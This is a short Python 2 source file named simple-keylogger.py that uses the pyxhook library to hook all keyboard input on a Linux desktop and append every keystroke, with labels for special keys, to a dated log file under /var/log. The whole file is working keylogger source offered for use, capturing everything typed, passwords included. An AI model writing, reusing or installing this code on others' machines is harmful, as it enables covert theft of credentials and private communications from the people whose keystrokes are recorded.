# !/usr/bin/env python
# ==============================================================================
# Title:           simple-keylogger.py
# Version:         1.0
# Author:          it-joe (https://github.com/it-joe)
# DateCreated:     02/02/2016
# DateUpdated:     
# Python Version:  2.7.12+
# ==============================================================================

import pyxhook
import time


timestr = time.strftime("%d-%m-%Y")

def pressedkey(info):
	"""This function is called every time a key is pressed."""
    f = open('/var/log/simple-keylogger/' + timestr + '.log', 'a')  # Create file object and open it for appending
    # Format info.key for better reading
    if info.Ascii == 32:
        f.write(' ')
    elif info.Key == 'Control_L':
        f.write('[CTRL] ')
    elif info.Key == 'Return':
        f.write('[CR] ')
    elif info.Key == 'Alt_L':
        f.write('[ALT] ')
    elif info.Key == 'Super_L':
        f.write('[SUPER_L] ')
    elif info.Key == '[65027]':
        f.write('[ALT GR] ')
    elif info.Key == 'Control_R':
        f.write('[CTRL_R] ')
    elif info.Key == 'Tab':
        f.write('[TAB] ')
    elif info.Key == 'Super_R':
        f.write('[SUPER_R] ')
    elif info.Key == 'Caps_Lock':
        f.write('[CAPSLOCK] ')
    elif info.Key == 'Shift_L':
        f.write('[SHIFT] ')
    elif info.Key == 'Shift_R':
        f.write('[SHIFT_R] ')
    elif info.Key == 'Escape':
        f.write('[ESC] ')
    elif info.Key == 'BackSpace':
        f.write('[BACKSPACE] ')
    elif info.Key == 'P_Enter':
        f.write('[ENTER] ')
    elif info.Key == 'Up':
        f.write('[UP] ')
    elif info.Key == 'Down':
        f.write('[DOWN] ')
    elif info.Key == 'Left':
        f.write('[LEFT] ')
    elif info.Key == 'Right':
        f.write('[RIGHT] ')
    elif info.Key == 'Insert':
        f.write('[INS] ')
    elif info.Key == 'Delete':
        f.write('[DEL] ')
    elif info.Key == 'Home':
        f.write('[POS1] ')
    elif info.Key == 'End':
        f.write('[END] ')
    elif info.Key == 'Print':
        f.write('[PRTSC] ')
    elif info.Key == 'Scroll_Lock':
        f.write('[SCRLK] ')
    elif info.Key == 'Page_Up':
        f.write('[PgUp] ')
    elif info.Key == 'Next':
        f.write('[PgDn] ')
    elif info.Key == 'F1':
        f.write('[F1] ')
    elif info.Key == 'F2':
        f.write('[F2] ')
    elif info.Key == 'F3':
        f.write('[F3] ')
    elif info.Key == 'F4':
        f.write('[F4] ')
    elif info.Key == 'F5':
        f.write('[F5] ')
    elif info.Key == 'F6':
        f.write('[F6] ')
    elif info.Key == 'F7':
        f.write('[F7] ')
    elif info.Key == 'F8':
        f.write('[F8] ')
    elif info.Key == 'F9':
        f.write('[F9] ')
    elif info.Key == 'F10':
        f.write('[F10] ')
    elif info.Key == 'F11':
        f.write('[F11] ')
    elif info.Key == 'F12':
        f.write('[F12] ')
    else:
        f.write(info.Key)

hookman = pyxhook.HookManager()  # Create hookmanager
hookman.KeyDown = pressedkey  # Define event when a key is pressed down
hookman.HookKeyboard()  # Hook the keyboard
hookman.start()  # Start the listener

running = True  # Create a loop to keep the application running
while running:
    time.sleep(0.1)

hookman.cancel()  # Close the listener